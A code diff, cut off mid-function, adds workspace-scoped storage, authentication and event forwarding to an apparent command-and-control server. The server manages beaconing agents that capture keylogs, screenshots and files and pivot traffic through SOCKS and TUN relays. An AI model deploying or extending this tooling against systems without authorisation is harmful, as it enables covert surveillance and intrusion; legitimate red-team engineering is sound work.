@@ -51,6 +51,7 @@ from rmm_socks import (
     SocksManager,
 )
 from rmm_tun import TunError, TunManager, normalize_tun_config
+from rmm_workspace import WorkspaceEventBroker, WorkspaceRegistry, valid_workspace_id
 from rmm_rclone import (
     RcloneConfigError,
     get_rclone_max_bytes,
@@ -121,8 +122,15 @@ def _env_int(name: str, default: int) -> int:
         return default
 
 
+def configured_storage_mode() -> str:
+    """Return the central persistence mode, defaulting to legacy server storage."""
+    value = os.environ.get("RMM_STORAGE_MODE", "server").strip().lower()
+    return value if value in {"server", "workspace"} else "server"
+
+
 # Per HTTP POST (each download chunk). Override with RMM_MAX_BODY_BYTES.
 MAX_BODY_BYTES = _env_int("RMM_MAX_BODY_BYTES", 32 * 1024 * 1024)
+MAX_WORKSPACE_PAYLOAD_BYTES = _env_int("RMM_MAX_WORKSPACE_PAYLOAD_BYTES", MAX_BODY_BYTES)
 
 
 def secure_compare(provided: str, expected: str) -> bool:
@@ -549,12 +557,15 @@ def _history_session_dir(session_id: str) -> str:
 
 def _event_for_history(ev: dict) -> dict:
     """Drop server-local filesystem paths before writing transcripts to disk."""
-    return {k: v for k, v in ev.items() if k != "artifact"}
+    return {k: v for k, v in ev.items() if k not in {"artifact", "workspace_payload"}}
 
 
 def _event_for_ws(ev: dict) -> dict:
     """Shrink large bodies so WS send_json does not block beacon handlers on slow clients."""
     out = dict(ev)
+    # Workspace services consume the full payload from WorkspaceEventBroker;
+    # ordinary operator WebSocket clients only need the transcript event.
+    out.pop("workspace_payload", None)
     body = out.get("body")
     if isinstance(body, str) and len(body) > MAX_WS_EVENT_BODY:
         omitted = len(body) - MAX_WS_EVENT_BODY
@@ -598,6 +609,9 @@ class Session:
         self.os_type = "windows"
         self.agent_type = "powershell"
         self.capabilities = []
+        # Workspace ownership is control-plane metadata. Transcript and
+        # artifact persistence belongs to the matching workspace service.
+        self.workspace_id = None
         # Configuration parameters
         self.sleep_seconds = 60  # Default 1 minute
         self.jitter_percent = 30  # Default 30% jitter
@@ -639,6 +653,7 @@ class Session:
             "os_type": self.os_type,
             "agent_type": self.agent_type,
             "capabilities": list(self.capabilities),
+            "workspace_id": self.workspace_id,
             "sleep_seconds": self.sleep_seconds,
             "jitter_percent": self.jitter_percent
         }
@@ -827,10 +842,16 @@ def _run_cli_readline(server, cli):
 
 
 class RMMServer:
+    storage_mode = "server"
+
     def __init__(self):
+        self.storage_mode = configured_storage_mode()
+        self.workspace_registry = WorkspaceRegistry.from_environment()
+        self.workspace_events = WorkspaceEventBroker()
         self.sessions = {}
         self.killed_sessions = set()
         self._persisted_session_configs = self._load_persisted_session_configs()
+        self._persisted_session_records = self._load_persisted_session_records()
         self.session_lock = threading.Lock()
         self.tty_lock = threading.Lock()  # Serialize async client stdout
         self._cli_use_ptk = False  # True when using prompt_toolkit (skip readline.redisplay in handle_result)
@@ -840,9 +861,14 @@ class RMMServer:
         self.socks = SocksManager(log_fn=self.log)
         self.tun_transport = SocksManager(log_fn=self.log)
         self.tun = TunManager(TUN_HELPER, self.tun_transport, log_fn=self.log)
+        # In workspace mode this stores transport-only relay configuration;
+        # the workspace service creates the listener or TUN device locally.
+        self.workspace_socks_configs = {}
+        self.workspace_tun_configs = {}
         self._sessions_broadcast_lock = threading.Lock()
         self._sessions_broadcast_timer = None
-        self._archive_orphaned_sessions_on_startup()
+        if self.storage_mode == "server":
+            self._archive_orphaned_sessions_on_startup()
 
     @staticmethod
     def _format_ago(seconds):
@@ -945,6 +971,9 @@ class RMMServer:
             session.work_dir = rec.get("work_dir")
         if rec.get("os_type"):
             session.os_type = rec.get("os_type")
+        workspace_id = str(rec.get("workspace_id") or "").strip()
+        if valid_workspace_id(workspace_id):
+            session.workspace_id = workspace_id
         session.config_synced = True
         return session
 
@@ -1082,6 +1111,7 @@ class RMMServer:
     def remove_persisted_session(self, session_id: str) -> None:
         """Drop a session from sessions.json (live registry file, not history events)."""
         self._persisted_session_configs.pop(session_id, None)
+        self._persisted_session_records.pop(session_id, None)
         if not os.path.exists(SESSION_FILE):
             return
         try:
@@ -1105,6 +1135,7 @@ class RMMServer:
                 sessions_data = json.load(f)
         
         sessions_data[session.id] = session.to_dict()
+        self._persisted_session_records[session.id] = dict(sessions_data[session.id])
         self._persisted_session_configs[session.id] = {
             "sleep_seconds": session.sleep_seconds,
             "jitter_percent": session.jitter_percent,
@@ -1152,6 +1183,81 @@ class RMMServer:
         if len(session_id_or_prefix) >= 4:
             return self.find_session_by_prefix(session_id_or_prefix)
         return None
+
+    def resolve_workspace_session(self, workspace_id: str, session_ref: str):
+        """Resolve a session only when it belongs to the authenticated workspace."""
+        if not valid_workspace_id(workspace_id):
+            return None
+        session = self.resolve_session(session_ref)
+        if session and session.workspace_id == workspace_id:
+            return session
+        return None
+
+    def workspace_sessions(self, workspace_id: str) -> list[dict]:
+        """Return active sessions assigned to one workspace."""
+        with self.session_lock:
+            return [
+                session.to_dict()
+                for session in self.sessions.values()
+                if session.workspace_id == workspace_id
+            ]
+
+    def workspace_candidates(self, workspace_id: str) -> list[dict]:
+        """Return unassigned active sessions available for an explicit claim."""
+        del workspace_id
+        with self.session_lock:
+            return [
+                session.to_dict()
+                for session in self.sessions.values()
+                if not session.workspace_id
+            ]
+
+    def claim_workspace_session(self, workspace_id: str, session_ref: str):
+        """Assign an unclaimed session to a workspace and persist the assignment."""
+        if not valid_workspace_id(workspace_id):
+            return None, "invalid_workspace"
+        with self.session_lock:
+            session = self.sessions.get(session_ref)
+            if not session:
+                matches = [
+                    item for sid, item in self.sessions.items() if sid.startswith(str(session_ref))
+                ]
+                if len(matches) == 1:
+                    session = matches[0]
+            if not session:
+                return None, "session_not_found"
+            if session.workspace_id and session.workspace_id != workspace_id:
+                return None, "session_claimed"
+            session.workspace_id = workspace_id
+        self.save_session(session)
+        self._broadcast_sessions_async()
+        return session, None
+
+    def workspace_submit_tasks(
+        self, workspace_id: str, session_id: str, channel: str, tasks: list[dict]
+    ) -> bool:
+        """Accept local workspace pivot tasks for the matching agent channel."""
+        session = self.resolve_workspace_session(workspace_id, session_id)
+        if not session or channel not in {"socks", "tun"}:
+            return False
+        manager = self.socks if channel == "socks" else self.tun_transport
+        return manager.submit_external_tasks(session.id, tasks)
+
+    def workspace_drain_responses(
+        self, workspace_id: str, session_id: str, channel: str
+    ) -> list[dict]:
+        """Drain agent responses that belong to a workspace-local pivot."""
+        session = self.resolve_workspace_session(workspace_id, session_id)
+        if not session or channel not in {"socks", "tun"}:
+            return []
+        manager = self.socks if channel == "socks" else self.tun_transport
+        return manager.drain_external_responses(session.id)
+
+    def workspace_publish_event(self, session, event: dict) -> None:
+        """Publish an event to the owning workspace's bounded transient queue."""
+        workspace_id = getattr(session, "workspace_id", None)
+        if workspace_id:
+            self.workspace_events.publish(workspace_id, session.id, event)
 
     def note_download_queued(self, session, remote_path: str) -> None:
         """Remember remote path for the next file_upload from this session."""
@@ -1209,6 +1315,8 @@ class RMMServer:
 
     def backfill_download_artifacts(self, session) -> None:
         """Scan RMM_logs/downloads for files belonging to this session."""
+        if self.storage_mode == "workspace":
+            return
         prefix = safe_session_storage_prefix(session.id)
         downloads_dir = os.path.join(LOG_DIR, "downloads")
         if not os.path.isdir(downloads_dir):
@@ -1239,6 +1347,8 @@ class RMMServer:
         session = self.resolve_session(session_id_or_prefix)
         if not session:
             return None
+        if self.storage_mode == "workspace":
+            return []
         self.backfill_download_artifacts(session)
         prefix = safe_session_storage_prefix(session.id)
         with self.session_lock:
@@ -1339,6 +1449,8 @@ class RMMServer:
         session_id = self.resolve_history_session_id(session_id_or_prefix)
         if not session_id:
             return None, None
+        if self.storage_mode == "workspace":
+            return session_id, []
         path = self._ai_chat_path(session_id)
         if not os.path.isfile(path):
             return session_id, []
@@ -1353,6 +1465,8 @@ class RMMServer:
 
     def save_ai_chat(self, session_id: str, messages: list[dict]) -> None:
         """Persist AI chat under RMM_logs/history/{session_id}/ai_chat.json."""
+        if self.storage_mode == "workspace":
+            return
         sid = validate_beacon_session_id(session_id)
         if not sid:
             return
@@ -1379,6 +1493,8 @@ class RMMServer:
         sid = validate_beacon_session_id(session_id)
         if not sid:
             return False
+        if self.storage_mode == "workspace":
+            return True
         try:
             path = self._ai_chat_path(sid)
         except ValueError:
@@ -1399,6 +1515,8 @@ class RMMServer:
         ended: bool = False,
         end_reason: str | None = None,
     ) -> None:
+        if self.storage_mode == "workspace":
+            return
         try:
             session_dir = _history_session_dir(session.id)
         except ValueError:
@@ -1425,6 +1543,8 @@ class RMMServer:
             self.log(f"History meta write failed for {session.id[:8]}: {e}", "WARNING")
 
     def _history_append_event(self, session, ev: dict) -> None:
+        if self.storage_mode == "workspace":
+            return
         try:
             session_dir = _history_session_dir(session.id)
         except ValueError:
@@ -1438,6 +1558,8 @@ class RMMServer:
             self.log(f"History event append failed for {session.id[:8]}: {e}", "WARNING")
 
     def _finalize_session_history(self, session, reason: str = "killed") -> None:
+        if self.storage_mode == "workspace":
+            return
         self._history_write_meta(session, ended=True, end_reason=reason)
 
     def resolve_history_session_id(self, session_id_or_prefix: str) -> str | None:
@@ -1457,6 +1579,8 @@ class RMMServer:
         return validate_beacon_session_id(session_id_or_prefix)
 
     def list_session_history(self) -> list[dict]:
+        if self.storage_mode == "workspace":
+            return []
         rows = []
         active_ids = set(self.sessions.keys())
         if not os.path.isdir(HISTORY_DIR):
@@ -1549,6 +1673,8 @@ class RMMServer:
         sid = validate_beacon_session_id(session_id)
         counts = {"downloads": 0, "screenshots": 0, "keylogs": 0, "staging": 0}
         if not sid:
+            return counts
+        if self.storage_mode == "workspace":
             return counts
         prefix = safe_session_storage_prefix(sid)
         pattern_prefix = f"{prefix}_"
@@ -1668,7 +1794,15 @@ class RMMServer:
             daemon=True,
         ).start()
 
-    def _record_event(self, session, event_type, body, command=None, artifact=None):
+    def _record_event(
+        self,
+        session,
+        event_type,
+        body,
+        command=None,
+        artifact=None,
+        workspace_payload: dict | None = None,
+    ):
         artifact_url = self._artifact_public_url(artifact) if artifact else None
         with self.session_lock:
             session._event_seq += 1
@@ -1681,9 +1815,23 @@ class RMMServer:
                 "artifact": artifact,
                 "artifact_url": artifact_url,
             }
+            if workspace_payload is not None:
+                try:
+                    payload_size = len(json.dumps(workspace_payload, ensure_ascii=False).encode())
+                except (TypeError, ValueError):
+                    payload_size = MAX_WORKSPACE_PAYLOAD_BYTES + 1
+                if payload_size <= MAX_WORKSPACE_PAYLOAD_BYTES:
+                    ev["workspace_payload"] = workspace_payload
+                else:
+                    self.log(
+                        f"Workspace event payload dropped: session={session.id[:8]} "
+                        f"type={event_type} bytes={payload_size}",
+                        "WARNING",
+                    )
             session.result_events.append(ev)
         self._history_append_event(session, ev)
         self._history_write_meta(session)
+        self.workspace_publish_event(session, ev)
         ws_ev = _event_for_ws(ev)
         threading.Thread(
             target=self.event_hub.broadcast_event,
@@ -1695,9 +1843,41 @@ class RMMServer:
                 session.wait_result = ev
                 session.wait_event.set()
 
-    def sessions_to_json(self):
+    def _publish_workspace_chunk(self, session, payload: dict) -> None:
+        """Publish a non-transcript artifact chunk to the local workspace."""
+        if self.storage_mode != "workspace" or not getattr(session, "workspace_id", None):
+            return
+        try:
+            payload_size = len(json.dumps(payload, ensure_ascii=False).encode())
+        except (TypeError, ValueError):
+            payload_size = MAX_WORKSPACE_PAYLOAD_BYTES + 1
+        if payload_size > MAX_WORKSPACE_PAYLOAD_BYTES:
+            self.log(
+                f"Workspace chunk dropped: session={session.id[:8]} bytes={payload_size}",
+                "WARNING",
+            )
+            return
+        self.workspace_publish_event(
+            session,
+            {
+                "id": 0,
+                "timestamp": datetime.now().isoformat(),
+                "type": "file_upload_chunk",
+                "body": "",
+                "command": None,
+                "artifact": None,
+                "artifact_url": None,
+                "workspace_payload": payload,
+            },
+        )
+
+    def sessions_to_json(self, workspace_id: str | None = None):
         with self.session_lock:
-            return [s.to_dict() for s in self.sessions.values()]
+            return [
+                s.to_dict()
+                for s in self.sessions.values()
+                if workspace_id is None or s.workspace_id == workspace_id
+            ]
 
     def _broadcast_sessions_async(self) -> None:
         """Push session list to operator WS clients without blocking beacon handlers."""
@@ -1728,8 +1908,13 @@ class RMMServer:
                 self.current_session = None
         self.remove_persisted_session(session.id)
         self.event_hub.broadcast_sessions(self.sessions_to_json())
-        self.tun.stop(session.id)
+        if self.storage_mode == "workspace":
+            self.tun_transport.stop(session.id)
+            getattr(self, "workspace_tun_configs", {}).pop(session.id, None)
+        else:
+            self.tun.stop(session.id)
         self.socks.stop(session.id)
+        getattr(self, "workspace_socks_configs", {}).pop(session.id, None)
         return True, session.id
 
     def start_socks(self, session_id: str, port: int = DEFAULT_SOCKS_PORT, bind_host: str = DEFAULT_BIND_HOST) -> bool:
@@ -1744,7 +1929,17 @@ class RMMServer:
             self.log(f"SOCKS pivot unavailable for {session.id[:8]}: {plugin_error}", "ERROR")
             return False
         try:
-            self.socks.start(session_id, port=port, bind_host=bind_host)
+            if self.storage_mode == "workspace":
+                self.socks.start_external(session_id, port=port, bind_host=bind_host)
+                getattr(self, "workspace_socks_configs", {})[session_id] = {
+                    "session_id": session_id,
+                    "bind_host": bind_host,
+                    "port": port,
+                    "socks_url": f"socks5://{bind_host}:{port}",
+                    "workspace_local": True,
+                }
+            else:
+                self.socks.start(session_id, port=port, bind_host=bind_host)
         except OSError as e:
             self.log(f"SOCKS failed to bind {bind_host}:{port}: {e}", "ERROR")
             return False
@@ -1783,6 +1978,7 @@ class RMMServer:
         if self.tun_active(session_id):
             return self.stop_tun(session_id)
         stopped = self.socks.stop(session_id)
+        getattr(self, "workspace_socks_configs", {}).pop(session_id, None)
         session = self.get_session(session_id)
         if session:
             self.record_operator_action(session, "socks stop", "socks")
@@ -1795,8 +1991,12 @@ class RMMServer:
 
     def list_socks_status(self) -> list[dict]:
         """Return public SOCKS relays with session identity when known."""
+        if self.storage_mode == "workspace":
+            relays = [dict(row) for row in getattr(self, "workspace_socks_configs", {}).values()]
+        else:
+            relays = self.socks.list_relays()
         rows = []
-        for relay in self.socks.list_relays():
+        for relay in relays:
             # A TUN relay uses a private SOCKS bridge as its egress. Keep that
             # implementation detail out of the public SOCKS inventory.
             if self.tun_active(relay["session_id"]):
@@ -1828,7 +2028,7 @@ class RMMServer:
             return "the Go TUN plugin path is invalid"
         if not os.path.isfile(plugin_path):
             return "build the TUN plugin first (POST /api/v1/plugins/build with name=tun)"
-        if not os.path.isfile(TUN_HELPER) or not os.access(TUN_HELPER, os.X_OK):
+        if self.storage_mode != "workspace" and (not os.path.isfile(TUN_HELPER) or not os.access(TUN_HELPER, os.X_OK)):
             return f"build the server TUN helper first (make tun-build; expected {TUN_HELPER})"
         return None
 
@@ -1843,7 +2043,25 @@ class RMMServer:
         normalized = normalize_tun_config(config)
         if self.socks_active(session.id):
             self.stop_socks(session.id)
-        relay = self.tun.start(session.id, normalized)
+        if self.storage_mode == "workspace":
+            self.tun_transport.start_external(
+                session.id,
+                port=0,
+                bind_host="127.0.0.1",
+                udp_idle_timeout=normalized["udp_timeout_seconds"],
+            )
+            getattr(self, "workspace_tun_configs", {})[session.id] = dict(normalized)
+            status = dict(normalized)
+            status.update(
+                {
+                    "session_id": session.id,
+                    "helper_alive": False,
+                    "workspace_local": True,
+                }
+            )
+        else:
+            relay = self.tun.start(session.id, normalized)
+            status = relay.status()
         self.record_operator_action(session, f"tun start {normalized['device_name']}", "tun")
         self._record_event(
             session,
@@ -1851,11 +2069,15 @@ class RMMServer:
             f"RMM TUN relay enabled on {normalized['device_name']}",
             command=f"tun start {normalized['device_name']}",
         )
-        return relay.status()
+        return status
 
     def stop_tun(self, session_id: str) -> bool:
         """Disable the server-side TUN frontend for one session."""
-        stopped = self.tun.stop(session_id)
+        if self.storage_mode == "workspace":
+            stopped = self.tun_transport.stop(session_id)
+            getattr(self, "workspace_tun_configs", {}).pop(session_id, None)
+        else:
+            stopped = self.tun.stop(session_id)
         session = self.get_session(session_id)
         if session:
             self.record_operator_action(session, "tun stop", "tun")
@@ -1865,16 +2087,32 @@ class RMMServer:
 
     def tun_active(self, session_id: str) -> bool:
         """Return whether a server-side TUN relay exists for a session."""
+        if self.storage_mode == "workspace":
+            return session_id in getattr(self, "workspace_tun_configs", {})
         return self.tun.get(session_id) is not None
 
     def tun_config(self, session_id: str) -> dict | None:
         """Return the safe operator configuration for a session relay."""
+        if self.storage_mode == "workspace":
+            config = getattr(self, "workspace_tun_configs", {}).get(session_id)
+            if not config:
+                return None
+            status = dict(config)
+            status.update({"session_id": session_id, "helper_alive": False, "workspace_local": True})
+            return status
         relay = self.tun.get(session_id)
         return relay.status() if relay else None
 
     def list_tun_status(self) -> list[dict]:
         """Return active TUN relays with session identity and beacon status."""
-        active = self.tun.list_status()
+        if self.storage_mode == "workspace":
+            active = []
+            for session_id, config in getattr(self, "workspace_tun_configs", {}).items():
+                row = dict(config)
+                row.update({"session_id": session_id, "helper_alive": False, "workspace_local": True})
+                active.append(row)
+        else:
+            active = self.tun.list_status()
         rows = []
         for row in active:
             session_id = row["session_id"]
@@ -1946,6 +2184,10 @@ class RMMServer:
                 session = Session(session_id, hostname, username, ip)
                 session.agent_type = (agent_type or "powershell").strip().lower()
                 session.capabilities = sorted(set(capabilities or []))
+                persisted_record = self._persisted_session_records.get(session_id, {})
+                persisted_workspace = str(persisted_record.get("workspace_id") or "").strip()
+                if valid_workspace_id(persisted_workspace):
+                    session.workspace_id = persisted_workspace
                 if persisted:
                     session.sleep_seconds = persisted["sleep_seconds"]
                     session.jitter_percent = persisted["jitter_percent"]
@@ -2161,21 +2403,45 @@ class RMMServer:
         event_body = result
         echoed_cmd = None
         plugin_result_failed = False
+        workspace_payload = None
 
         if cmd_type == "file_upload":
             try:
                 data = json.loads(result)
-                filepath = self._save_file_upload(session, data, timestamp)
-                if not filepath:
-                    return
                 remote_path = (data.get("remote_path") or "").strip()
                 if not remote_path:
-                    remote_path = self.pop_pending_download_path(
-                        session, data.get("filename", "")
+                    if self.storage_mode == "workspace" and "offset" in data and not data.get("eof"):
+                        with self.session_lock:
+                            remote_path = (
+                                session.pending_downloads[0]
+                                if session.pending_downloads
+                                else os.path.basename(str(data.get("filename") or "unknown"))
+                            )
+                    else:
+                        remote_path = self.pop_pending_download_path(
+                            session, data.get("filename", "")
+                        )
+                if self.storage_mode == "workspace":
+                    workspace_payload = {
+                        "kind": "file_upload",
+                        "data": data,
+                        "remote_path": remote_path,
+                    }
+                    if "offset" in data and not data.get("eof"):
+                        self._publish_workspace_chunk(session, workspace_payload)
+                        return
+                    filename = safe_storage_filename(
+                        data.get("filename", f"unknown_{timestamp}"),
+                        f"unknown_{timestamp}",
                     )
-                self.register_download_artifact(session, filepath, remote_path)
-                artifact = filepath
-                event_body = f"{remote_path} → {os.path.basename(filepath)}"
+                    event_body = f"{remote_path} → {filename}"
+                else:
+                    filepath = self._save_file_upload(session, data, timestamp)
+                    if not filepath:
+                        return
+                    self.register_download_artifact(session, filepath, remote_path)
+                    artifact = filepath
+                    event_body = f"{remote_path} → {os.path.basename(filepath)}"
                 echoed_cmd = f"download {remote_path}"
                 tty_lines.append(("log", f"File downloaded: {remote_path}", "SUCCESS"))
             except Exception as e:
@@ -2184,18 +2450,27 @@ class RMMServer:
 
         elif cmd_type == "screenshot":
             try:
-                content = base64.b64decode(result)
-                filepath = safe_join_under(
-                    LOG_DIR,
-                    "screenshots",
-                    f"{safe_session_storage_prefix(session.id)}_{timestamp}.png",
-                )
-                with open(filepath, 'wb') as f:
-                    f.write(content)
-                artifact = filepath
-                event_body = filepath
+                if self.storage_mode == "workspace":
+                    filename = f"{safe_session_storage_prefix(session.id)}_{timestamp}.png"
+                    workspace_payload = {
+                        "kind": "screenshot",
+                        "filename": filename,
+                        "content_b64": result,
+                    }
+                    event_body = f"Screenshot captured: {filename}"
+                else:
+                    content = base64.b64decode(result)
+                    filepath = safe_join_under(
+                        LOG_DIR,
+                        "screenshots",
+                        f"{safe_session_storage_prefix(session.id)}_{timestamp}.png",
+                    )
+                    with open(filepath, 'wb') as f:
+                        f.write(content)
+                    artifact = filepath
+                    event_body = filepath
                 echoed_cmd = "screenshot"
-                tty_lines.append(("log", f"Screenshot saved: {filepath}", "SUCCESS"))
+                tty_lines.append(("log", f"Screenshot captured for {session.id[:8]}", "SUCCESS"))
             except Exception as e:
                 event_body = str(e)
                 tty_lines.append(("log", f"Screenshot error: {e}", "ERROR"))
@@ -2203,16 +2478,24 @@ class RMMServer:
 
         elif cmd_type == "keylog":
             try:
-                filepath = safe_join_under(
-                    LOG_DIR,
-                    "keylogs",
-                    f"{safe_session_storage_prefix(session.id)}_{timestamp}.log",
-                )
-                with open(filepath, 'w', encoding='utf-8') as f:
-                    f.write(result)
-                artifact = filepath
+                if self.storage_mode == "workspace":
+                    filename = f"{safe_session_storage_prefix(session.id)}_{timestamp}.log"
+                    workspace_payload = {
+                        "kind": "keylog",
+                        "filename": filename,
+                        "content": result,
+                    }
+                else:
+                    filepath = safe_join_under(
+                        LOG_DIR,
+                        "keylogs",
+                        f"{safe_session_storage_prefix(session.id)}_{timestamp}.log",
+                    )
+                    with open(filepath, 'w', encoding='utf-8') as f:
+                        f.write(result)
+                    artifact = filepath
                 event_body = result[:2000] if len(result) > 2000 else result
-                tty_lines.append(("log", f"Keylog saved: {filepath}", "SUCCESS"))
+                tty_lines.append(("log", f"Keylog captured for {session.id[:8]}", "SUCCESS"))
             except Exception as e:
                 event_body = str(e)
                 tty_lines.append(("log", f"Keylog save error: {e}", "ERROR"))
@@ -2296,7 +2579,14 @@ class RMMServer:
                 level,
             )
 
-        self._record_event(session, cmd_type, event_body, command=echoed_cmd, artifact=artifact)
+        self._record_event(
+            session,
+            cmd_type,
+            event_body,
+            command=echoed_cmd,
+            artifact=artifact,
+            workspace_payload=workspace_payload,
+        )
 
         with self.tty_lock:
             for kind, *rest in tty_lines:
@@ -2312,6 +2602,15 @@ class RMMServer:
                     readline.redisplay()
                 except Exception:
                     pass
+
+def _resolve_api_session(handler, session_ref: str):
+    """Resolve a handler session while keeping lightweight test doubles compatible."""
+    resolver = getattr(handler, "_api_session", None)
+    if resolver is not None:
+        return resolver(session_ref)
+    server = getattr(handler, "server_instance", None)
+    return server.resolve_session(session_ref) if server is not None else None
+
 
 class RMMHandler(BaseHTTPRequestHandler):
     server_instance = None
@@ -2383,11 +2682,37 @@ class RMMHandler(BaseHTTPRequestHandler):
         return ""
 
     def _api_authorized(self, qs=None):
+        self._workspace_scope_id = None
         if INSECURE and not API_TOKEN:
             return True
-        if not API_TOKEN:
+        if API_TOKEN and secure_compare(self._api_token_from_request(qs), API_TOKEN):
+            return True
+        server = getattr(self, "server_instance", None)
+        registry = getattr(server, "workspace_registry", None)
+        if registry is None:
             return False
-        return secure_compare(self._api_token_from_request(qs), API_TOKEN)
+        workspace_id = self.headers.get("X-RMM-Workspace", "").strip()
+        workspace_token = self.headers.get("X-RMM-Workspace-Token", "").strip()
+        if registry.authenticate(workspace_id, workspace_token):
+            self._workspace_scope_id = workspace_id
+            return True
+        return False
+
+    def _workspace_scope(self) -> str | None:
+        """Return the workspace scope established by the current API auth check."""
+        return getattr(self, "_workspace_scope_id", None)
+
+    def _api_session(self, session_ref: str):
+        """Resolve a session while enforcing workspace ownership when scoped."""
+        server = self.server_instance
+        workspace_id = self._workspace_scope()
+        if workspace_id:
+            resolver = getattr(server, "resolve_workspace_session", None)
+            if resolver:
+                return resolver(workspace_id, session_ref)
+            session = server.resolve_session(session_ref)
+            return session if getattr(session, "workspace_id", None) == workspace_id else None
+        return server.resolve_session(session_ref)
 
     def _api_unauthorized(self):
         self._json(401, {"error": "unauthorized", "detail": "Valid RMM_API_TOKEN required (Bearer or X-RMM-Token)"})
@@ -2644,6 +2969,56 @@ class RMMHandler(BaseHTTPRequestHandler):
         if parts is None:
             return False
         srv = self.server_instance
+        workspace_id = getattr(self, "_workspace_scope", lambda: None)()
+
+        if parts == ["workspace", "sessions"]:
+            if not workspace_id:
+                self._json(403, {"error": "workspace_auth_required"})
+                return True
+            self._json(200, {"workspace_id": workspace_id, "sessions": srv.workspace_sessions(workspace_id)})
+            return True
+
+        if parts == ["workspace", "candidates"]:
+            if not workspace_id:
+                self._json(403, {"error": "workspace_auth_required"})
+                return True
+            self._json(200, {"workspace_id": workspace_id, "sessions": srv.workspace_candidates(workspace_id)})
+            return True
+
+        if parts == ["workspace", "events"]:
+            if not workspace_id:
+                self._json(403, {"error": "workspace_auth_required"})
+                return True
+            try:
+                since = max(0, int(qs.get("since", ["0"])[0] or 0))
+                limit = max(1, min(1000, int(qs.get("limit", ["100"])[0] or 100)))
+            except (TypeError, ValueError):
+                self._json(400, {"error": "invalid_workspace_cursor"})
+                return True
+            self._json(200, srv.workspace_events.read(workspace_id, since=since, limit=limit))
+            return True
+
+        if len(parts) == 5 and parts[:2] == ["workspace", "sessions"] and parts[4] == "responses":
+            if not workspace_id:
+                self._json(403, {"error": "workspace_auth_required"})
+                return True
+            channel = parts[3]
+            if channel not in {"socks", "tun"}:
+                self._json(404, {"error": "not_found"})
+                return True
+            session = srv.resolve_workspace_session(workspace_id, parts[2])
+            if not session:
+                self._json(404, {"error": "session_not_found"})
+                return True
+            self._json(
+                200,
+                {
+                    "session_id": session.id,
+                    "channel": channel,
+                    "responses": srv.workspace_drain_responses(workspace_id, session.id, channel),
+                },
+            )
+            return True
 
         if parts == ["rclone", "config"]:
             config = rclone_public_config()
@@ -2657,7 +3032,11 @@ class RMMHandler(BaseHTTPRequestHandler):
             return True
 
         if parts == ["health"]:
-            self._json(200, {"status": "ok", "sessions": len(srv.sessions)})
+            if workspace_id:
+                count = len(srv.workspace_sessions(workspace_id))
+            else:
+                count = len(srv.sessions)
+            self._json(200, {"status": "ok", "sessions": count, "storage_mode": srv.storage_mode})
             return True
 
         if parts == ["agent", "script"]:
@@ -2694,21 +3073,35 @@ class RMMHandler(BaseHTTPRequestHandler):
             return True
 
         if parts == ["sessions"]:
-            self._json(200, {"sessions": srv.sessions_to_json()})
+            try:
+                sessions = srv.sessions_to_json(workspace_id=workspace_id)
+            except TypeError:
+                sessions = srv.sessions_to_json()
+            self._json(200, {"sessions": sessions})
             return True
 
         if parts == ["socks"]:
             relays = srv.list_socks_status()
+            if workspace_id:
+                relays = [
+                    row for row in relays
+                    if getattr(srv.get_session(row.get("session_id")), "workspace_id", None) == workspace_id
+                ]
             self._json(200, {"count": len(relays), "relays": relays})
             return True
 
         if parts == ["tun"]:
             relays = srv.list_tun_status()
+            if workspace_id:
+                relays = [
+                    row for row in relays
+                    if getattr(srv.get_session(row.get("session_id")), "workspace_id", None) == workspace_id
+                ]
             self._json(200, {"count": len(relays), "relays": relays})
             return True
 
         if len(parts) == 2 and parts[0] == "sessions":
-            session = srv.resolve_session(parts[1])
+            session = _resolve_api_session(self, parts[1])
             if not session:
                 self._json(404, {"error": "session_not_found"})
                 return True
@@ -2718,6 +3111,9 @@ class RMMHandler(BaseHTTPRequestHandler):
         if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "events":
             since_id = int(qs.get("since", ["0"])[0] or 0)
             limit = int(qs.get("limit", ["50"])[0] or 50)
+            if workspace_id and not _resolve_api_session(self, parts[1]):
+                self._json(404, {"error": "session_not_found"})
+                return True
             events = srv.get_events(parts[1], since_id=since_id, limit=limit)
             if events is None:
                 self._json(404, {"error": "session_not_found"})
@@ -2726,7 +3122,7 @@ class RMMHandler(BaseHTTPRequestHandler):
             return True
 
         if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "downloads":
-            session = srv.resolve_session(parts[1])
+            session = _resolve_api_session(self, parts[1])
             if not session:
                 self._json(404, {"error": "session_not_found"})
                 return True
@@ -2738,6 +3134,9 @@ class RMMHandler(BaseHTTPRequestHandler):
             return True
 
         if len(parts) == 4 and parts[0] == "sessions" and parts[2] == "ai" and parts[3] == "chat":
+            if workspace_id and not _resolve_api_session(self, parts[1]):
+                self._json(404, {"error": "session_not_found"})
+                return True
             session_id, messages = srv.get_ai_chat(parts[1])
             if session_id is None or messages is None:
                 self._json(404, {"error": "session_not_found"})
@@ -2756,12 +3155,18 @@ class RMMHandler(BaseHTTPRequestHandler):
             return True
 
         if parts == ["history"]:
+            if workspace_id:
+                self._json(200, {"sessions": [], "count": 0})
+                return True
             rows = srv.list_session_history()
             ended = [r for r in rows if not r.get("active")]
             self._json(200, {"sessions": ended, "count": len(ended)})
             return True
 
         if len(parts) == 2 and parts[0] == "history":
+            if workspace_id:
+                self._json(404, {"error": "session_not_found"})
+                return True
             meta = srv.get_history_meta(parts[1])
             if not meta:
                 self._json(404, {"error": "session_not_found"})
@@ -2770,6 +3175,9 @@ class RMMHandler(BaseHTTPRequestHandler):
             return True
 
         if len(parts) == 3 and parts[0] == "history" and parts[2] == "events":
+            if workspace_id:
+                self._json(404, {"error": "session_not_found"})
+                return True
             since_id = int(qs.get("since", ["0"])[0] or 0)
             limit = int(qs.get("limit", ["500"])[0] or 500)
             session_id, events = srv.get_history_events(parts[1], since_id=since_id, limit=limit)
@@ -2780,6 +3188,9 @@ class RMMHandler(BaseHTTPRequestHandler):
             return True
 
         if len(parts) == 3 and parts[0] == "artifacts":
+            if workspace_id and parts[1] != "agent-builds":
+                self._json(404, {"error": "not_found"})
+                return True
             return self._serve_artifact(parts[1], parts[2], qs)
 
         if parts == ["plugins"]:
@@ -2804,6 +3215,39 @@ class RMMHandler(BaseHTTPRequestHandler):
         if parts is None:
             return False
         srv = self.server_instance
+        workspace_id = getattr(self, "_workspace_scope", lambda: None)()
+
+        if parts == ["workspace", "claims"]:
+            if not workspace_id:
+                self._json(403, {"error": "workspace_auth_required"})
+                return True
